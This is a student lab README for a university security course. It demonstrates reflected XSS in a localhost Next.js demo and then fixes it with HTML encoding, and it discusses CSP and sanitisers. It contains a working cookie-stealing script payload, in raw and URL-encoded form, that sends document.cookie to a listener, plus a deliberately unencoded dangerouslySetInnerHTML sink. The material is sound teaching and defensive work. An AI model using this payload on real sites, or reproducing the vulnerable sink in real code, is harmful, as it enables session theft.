# DevHub Docs — Reflected XSS lab

**Course:** IT-30001 Cyber Security, Autumn 2026, IIIT Allahabad
**Assignment:** Web Server Security — Exploitation and Mitigation of Four Vulnerability Categories
**Category / variant:** Cross-Site Scripting (XSS) → **Reflected XSS** (Table 1, Variant 2)
**Scope:** This application and everything in it runs on `localhost` only, with dummy
test data. It is built solely to satisfy the assignment's authorised-testing
requirement ("test only your own group's application") and is not deployed anywhere.

## What this is

A tiny mock "developer docs" search portal (`DevHub Docs`) with two builds of the
same page:

| Route         | Behaviour                                                              |
| ------------- | ----------------------------------------------------------------------- |
| `/vulnerable` | Reflects the `q` search parameter into the page with **no output encoding**. |
| `/patched`    | Same page, same code path, but the value is **HTML-encoded** before insertion, and the session cookie is `HttpOnly`. |

Both routes share the same layout (`components/SearchShell.tsx`) so the only
functional difference between them is the encoding step — see the diff between
[`app/vulnerable/page.tsx`](app/vulnerable/page.tsx) and
[`app/patched/page.tsx`](app/patched/page.tsx).

## (a) Vulnerable implementation

File: [`app/vulnerable/page.tsx`](app/vulnerable/page.tsx)

```tsx
const raw = sp.q;
const q = typeof raw === "string" ? raw : "";

// VULNERABLE: untrusted input concatenated straight into an HTML string,
// then handed to React's dangerouslySetInnerHTML with no encoding step.
const resultHtml = q ? `Showing results for: ${q}` : "";

<div dangerouslySetInnerHTML={{ __html: resultHtml }} />
```

`q` comes directly from the URL query string on every request — nothing is
stored server-side, so the attack only exists for the duration of one reflected
response (that's what makes it "reflected" rather than "stored").

The companion session cookie is also set without `HttpOnly` on this route
(`proxy.ts`), so it is readable from `document.cookie` by any script that runs
on the page — including an injected one.

## (b) Working exploit

With the dev server running (`npm run dev`, default `http://localhost:3000`)
and the attacker listener running (`node ../attacker-listener/listener.js`,
listens on `127.0.0.1:9000`), paste this into the DevHub Docs search box on
`/vulnerable` and hit Search:

```html
<script>new Image().src="http://127.0.0.1:9000/steal?c="+encodeURIComponent(document.cookie)</script>
```

Or as a single URL (GET-based reflected XSS — no stored state, no victim
interaction beyond visiting a crafted link):

```
http://localhost:3000/vulnerable?q=%3Cscript%3Enew%20Image().src%3D%22http%3A%2F%2F127.0.0.1%3A9000%2Fsteal%3Fc%3D%22%2BencodeURIComponent(document.cookie)%3C%2Fscript%3E
```

Result, verified locally:

* The "Showing results for:" box renders **empty** — the injected `<script>`
  executed instead of being displayed as text.
* `attacker-listener/loot.log` receives a line such as:
  ```
  [2026-11-15T09:50:41.546Z] from=127.0.0.1 cookie=session_id=test_user_8492
  ```
  i.e. the dummy session cookie was read via `document.cookie` and sent to a
  third party the victim never intended to talk to.

## (c) Root cause

User-controlled input (`q`) is written into the page's HTML with no
context-aware encoding between "untrusted input" and the HTML sink. The
browser cannot distinguish attacker-supplied markup from the page's own
markup, so a `<script>` payload is parsed and executed as part of the page.
Compounding this, the session cookie lacked `HttpOnly`, so the injected script
could read it directly.

## (d) Mitigation implemented

**Context-aware output encoding**, applied in [`app/patched/page.tsx`](app/patched/page.tsx)
via [`lib/escapeHtml.ts`](lib/escapeHtml.ts):

```ts
export function escapeHtml(input: string): string {
  return input
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}
```

```tsx
const safeQ = escapeHtml(q);
const resultHtml = q ? `Showing results for: ${safeQ}` : "";
```

Same sink, same payload, verified locally on `/patched`:

* The page now renders the **literal text**
  `Showing results for: <script>new Image().src="http://127.0.0.1:9000/steal?c="+encodeURIComponent(document.cookie)</script>` —
  visible on screen, not executed.
* `attacker-listener/loot.log` receives **nothing** — zero requests reach the
  listener.
* As an additional, independently-working layer (bonus, not the required
  single mitigation): the `/patched` session cookie is set with `HttpOnly`
  (`proxy.ts`), so even a payload that slipped past encoding elsewhere still
  could not read the cookie via `document.cookie`.

## (e) Other mitigations (theory only, per assignment item 3/(e))

* **Framework auto-escaping.** React/JSX escapes text content by default when
  you interpolate a value normally (`{q}`); this demo's vulnerable path only
  exists because it deliberately bypasses that default via
  `dangerouslySetInnerHTML`. In most real Next.js/React code, simply *not*
  using `dangerouslySetInnerHTML` (or an equivalent raw-HTML sink in another
  framework) gets you this protection automatically.
* **A sanitiser for rich HTML** (e.g. DOMPurify) — used when some HTML
  formatting from the user genuinely needs to be preserved (bold, links,
  etc.) and plain encoding would be too strict. It parses the input and
  strips/rewrites dangerous tags and attributes (`<script>`, `onerror=`,
  `javascript:` URLs) while keeping an allow-listed safe subset.
* **Content Security Policy (CSP).** A `script-src` directive (ideally with a
  per-request nonce, not `'unsafe-inline'`) tells the browser to refuse to run
  inline or third-party scripts that weren't explicitly authorised, so even
  if a payload reached the DOM it wouldn't execute. We looked at wiring this
  up live here, but a CSP strict enough to block injected inline scripts also
  blocks Next.js's own inline hydration/streaming scripts unless you add a
  per-request nonce — and Next's own docs note nonce-based CSP is
  incompatible with this route's Partial Prerendering. It's a real,
  recommended mitigation; we just keep it theory-only in this build rather
  than fighting the framework's rendering mode for a demo.
* **Safe DOM sinks.** Preferring `textContent`/`innerText` (or a framework's
  default text interpolation) over `innerHTML`/`dangerouslySetInnerHTML`
  removes the HTML-parsing sink entirely for places that never needed to
  render markup in the first place.

## Running it

```bash
cd devhub-docs
npm install
npm run dev   # http://localhost:3000
```

In another terminal, for the cookie-theft part of the demo:

```bash
cd attacker-listener
node listener.js   # http://127.0.0.1:9000, logs to loot.log
```

Use a **clean/incognito browser window**, so no unrelated cookies from other
local projects show up in `document.cookie`.

## Demo video

The narrated walkthrough is at
[`../video/FINAL-reflected-xss.mp4`](../video/FINAL-reflected-xss.mp4) (about
3:46). The individual scene recordings it was assembled from are in the same
`video/` folder.

## Ownership

Implemented by: Vishwas (IIT2024087) — Reflected XSS variant.
